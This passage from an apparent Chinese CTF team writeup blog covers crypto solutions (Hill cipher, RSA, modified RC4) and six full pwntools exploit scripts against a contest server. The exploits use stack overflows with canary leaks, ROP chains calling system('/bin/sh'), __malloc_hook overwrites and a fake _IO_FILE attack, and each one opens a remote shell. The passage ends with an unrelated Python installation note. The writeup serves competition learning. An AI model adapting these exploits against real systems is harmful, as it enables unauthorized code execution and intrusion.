<p>将其中的 %7B %21 %7D 与ASCII表对应，得出符号为{ ! }</p>
<p>所以flag应为 HEBTUCTF{Crypt0_15_EasY!}</p>
<h2 id="蓝精灵"><a href="#蓝精灵" class="headerlink" title="蓝精灵"></a>蓝精灵</h2><p>希尔密码</p>
<figure class="image-box">
                <img src="./55.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="so-easy"><a href="#so-easy" class="headerlink" title="so_easy"></a>so_easy</h2><p>下载后发现是关于RSA算法，百度一下，<br><figure class="image-box">
                <img src="./56.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<figure class="image-box">
                <img src="./57.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <img src="./58.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">第一步：随机两个质数p、q</span><br><span class="line"></span><br><span class="line">第二步：计算n即欧拉函数**n = P * Q，P 与 Q 均为质数，则 φ(n) = φ(P * Q)= φ(P - 1)*φ(Q - 1) = (P - 1)*(Q - 1)  记为m</span><br><span class="line"></span><br><span class="line">第三步：随机选择一个e，条件：1&lt;e&lt;m,e与m互质</span><br><span class="line"></span><br><span class="line">不能选择 φ(n)，这样公钥和私钥就相同了。</span><br><span class="line"></span><br><span class="line">第四步：有一个整数d，使得e*d除以m的余数为1</span><br><span class="line"></span><br><span class="line">不同的e能够生成不同的d，因此可以生成多个密钥对。</span><br><span class="line"></span><br><span class="line">这里不知道e，百度了好久CTFRSA算法，有挺多ctf题都有RSA算法，许多密码学题中的RSA算法，</span><br></pre></td></tr></table></figure>
<p>里面提到<figure class="image-box">
                <img src="./59.png" alt="图片" title class>
                <p>图片</p>
            </figure>，e=65537，得到私钥d。</p>
<p>hebtu{4f7b3c45-ab9f-4ab4-a79e}</p>
<h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + s[i] + k[i]) % <span class="number">9</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];     <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; Len; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">8</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">8</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];      <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">8</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">8</span>] = &#123; <span class="number">7</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span> &#125;;<span class="comment">//S-box</span></span><br><span class="line">    <span class="comment">////char key[256] = &#123; "justfortest" &#125;;</span></span><br><span class="line">    <span class="keyword">char</span> pData[<span class="number">512</span>] = <span class="string">"kfggtb&#125;thiu[jtXU@2Xeu&#123;uu|"</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(pData);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">////printf("pData=%s\n", pData);</span></span><br><span class="line">    <span class="comment">////printf("key=%s,length=%d\n\n", key, strlen(key));</span></span><br><span class="line">    <span class="comment">////rc4_init(s, (unsigned char*)key, strlen(key)); //已经完成了初始化</span></span><br><span class="line">    <span class="comment">////printf("完成对S[i]的初始化，如下：\n\n");</span></span><br><span class="line">    <span class="comment">////for (i = 0; i &lt; 256; i++)</span></span><br><span class="line">    <span class="comment">////&#123;</span></span><br><span class="line">    <span class="comment">////    printf("%02X", s[i]);</span></span><br><span class="line">    <span class="comment">////    if (i &amp;&amp; (i + 1) % 16 == 0)putchar('\n');</span></span><br><span class="line">    <span class="comment">////&#125;</span></span><br><span class="line">    <span class="comment">////printf("\n\n");</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pData=%s\n\n"</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"已经加密，现在解密:\n\n"</span>);</span><br><span class="line">    <span class="comment">//rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥</span></span><br><span class="line">    rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//解密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pData=%s\n\n"</span>, pData);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./60.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="0x01-窝窝头"><a href="#0x01-窝窝头" class="headerlink" title="0x01 窝窝头"></a>0x01 窝窝头</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process('./wowotou')</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10020</span>)</span><br><span class="line">p.recvuntil(<span class="string">'How much is a sorghum?'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">100</span>+p32(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br><span class="line">----------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<h2 id="0x02-stackpwn2"><a href="#0x02-stackpwn2" class="headerlink" title="0x02 stackpwn2"></a>0x02 stackpwn2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process('./stackpwn2')</span></span><br><span class="line">p=remote(<span class="string">'183.129.189.60'</span>,<span class="number">10000</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'checking the output system...\n'</span>,<span class="string">'%9$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary=int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">'aaaaaaaa'</span>+p64(<span class="number">0x00000000004009c3</span>)+p64(<span class="number">0x000000000601018</span>)+p64(<span class="number">0x0400650</span>)+p64(<span class="number">0x0000000004008A2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"What you want to do?\n"</span>,payload)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">obj=LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-obj.dump(<span class="string">'puts'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">'aaaaaaaa'</span>+p64(<span class="number">0x00000000004009c3</span>)+p64(libc_base+obj.dump(<span class="string">"str_bin_sh"</span>))+p64(libc_base+obj.dump(<span class="string">'system'</span>))+p64(<span class="number">0x0000000004008A2</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x03-pwn-disco"><a href="#0x03-pwn-disco" class="headerlink" title="0x03 pwn_disco"></a>0x03 pwn_disco</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10002</span>)</span><br><span class="line"><span class="comment">#p=process('./pwn_disco')</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line">	p.sendafter(<span class="string">'color:'</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"0"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">	p.sendafter(<span class="string">'color:'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'draw:'</span>,<span class="string">"%15$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">libc_base=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)-(<span class="number">0x7f7e0aafb830</span><span class="number">-0x7f7e0aadb000</span>)</span><br><span class="line">success(<span class="string">"libc_base===&gt;0x%x"</span>%libc_base)</span><br><span class="line">create(<span class="number">0</span>,<span class="string">'11111'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">create(<span class="number">0</span>,p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">onegad=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">create(<span class="number">1</span>,<span class="string">'\x00'</span>*(<span class="number">0x13</span><span class="number">-0x8</span>)+p64(libc_base+onegad[<span class="number">3</span>])+p64(libc_base+onegad[<span class="number">3</span>]))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index:'</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Hard-pwn"><a href="#0x04-Hard-pwn" class="headerlink" title="0x04 Hard_pwn"></a>0x04 Hard_pwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">': '</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">': '</span>,<span class="string">"1"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">': '</span>,str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">': '</span>,<span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line">	p.sendlineafter(<span class="string">": "</span>,str(size))</span><br><span class="line">	p.sendafter(<span class="string">':'</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">': '</span>,<span class="string">"4"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./hard_pwn")</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10026</span>)</span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#3</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x100</span>,<span class="number">0xf0</span>*<span class="string">'a'</span>+p64(<span class="number">0x1a0</span>)+p64(<span class="number">0xa0</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"You play is "</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-(<span class="number">0x00007ffff7dd1b78</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">_IO_list_all=libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">success(<span class="string">"libc_base=====&gt;0x%x"</span>%libc_base)</span><br><span class="line">pause()</span><br><span class="line">fake_file=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0xa0</span>,<span class="string">'a'</span>*<span class="number">0x90</span>+fake_file)</span><br><span class="line">fake_file=p64(<span class="number">0</span>)+p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x18cd57</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xc8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">fake_file+=p64(libc_base+<span class="number">0x3c37a0</span><span class="number">-8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)</span><br><span class="line">fake_file+=p64(libc_base+libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x100</span>,fake_file)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x05-stackpwn"><a href="#0x05-stackpwn" class="headerlink" title="0x05 stackpwn"></a>0x05 stackpwn</h2><p>简单的栈溢出泄露libc版本，构造rop拿shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">elf=ELF(<span class="string">'stackpwn'</span>)</span><br><span class="line">libc=ELF(<span class="string">'libc6_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line"><span class="comment">#p=process("stackpwn")</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10022</span>)</span><br><span class="line">pop_rdi=<span class="number">0x00400933</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">libc_got=elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">main_addr=<span class="number">0x040080D</span></span><br><span class="line">libc_start=libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">binaddr=<span class="number">0x400954</span></span><br><span class="line">system_libc=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">p.recvuntil(<span class="string">"input your instructions...\n"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span> + p64(pop_rdi)+p64(libc_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line">libc_base=libc-libc_start</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">p.recvuntil(<span class="string">"input your instructions...\n"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span> + p64(pop_rdi)+p64(binaddr)+p64(system_libc+libc_base)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x06-easy-pwn"><a href="#0x06-easy-pwn" class="headerlink" title="0x06 easy_pwn"></a>0x06 easy_pwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10016</span>)</span><br><span class="line">elf=ELF(<span class="string">'pwn'</span>)</span><br><span class="line">libc=ELF(<span class="string">'libc6_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">libc_got=elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">libc_start=libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">binaddr=<span class="number">0x006010A0</span></span><br><span class="line">main_addr=<span class="number">0x0004006F9</span></span><br><span class="line">pop_rdi=<span class="number">0x004007d3</span></span><br><span class="line">system_libc=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Leave your name: "</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Now play your game: "</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">88</span> + p64(pop_rdi) + p64(libc_got)+p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line">libc_base=libc-libc_start</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">p.recvuntil(<span class="string">"Leave your name: "</span>)</span><br><span class="line">p.send(<span class="string">"/bin/sh\x00\x00"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">88</span> + p64(pop_rdi)+p64(binaddr)+p64(system_libc+libc_base)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 团队ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[win10安装python2和python3兼容运行]]></title>
      <url>/%E6%90%AD%E5%BB%BA/ckwd5ws9w005hd0ucw2387vvo/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出去打比赛发现自己的python很有问题,python2和python3经常不能兼容使用,pip也是只能安装python3的包,用的很憋屈,所以打算重装下,并记录过程</p>
<h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><p>去 <a href="https://www.python.org/downloads/" target="_blank" rel="noopener">官网</a><br>这里我下的是python3.7.5和python2.7.17<br>在环境变量里添加用户变量PATH(以下是我的配置路径)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Local\Programs\Python\Python37\Scripts;</span><br><span class="line">C:\Users\Administrator\AppData\Local\Programs\Python\Python37;</span><br><span class="line">C:\Python27\Scripts</span><br><span class="line">C:\Python27</span><br></pre></td></tr></table></figure></p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="方法一-亲测可用"><a href="#方法一-亲测可用" class="headerlink" title="方法一(亲测可用)"></a>方法一(亲测可用)</h3><p>启动python<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py -2 //调用python2</span><br><span class="line">py -3 //调用python3</span><br></pre></td></tr></table></figure></p>
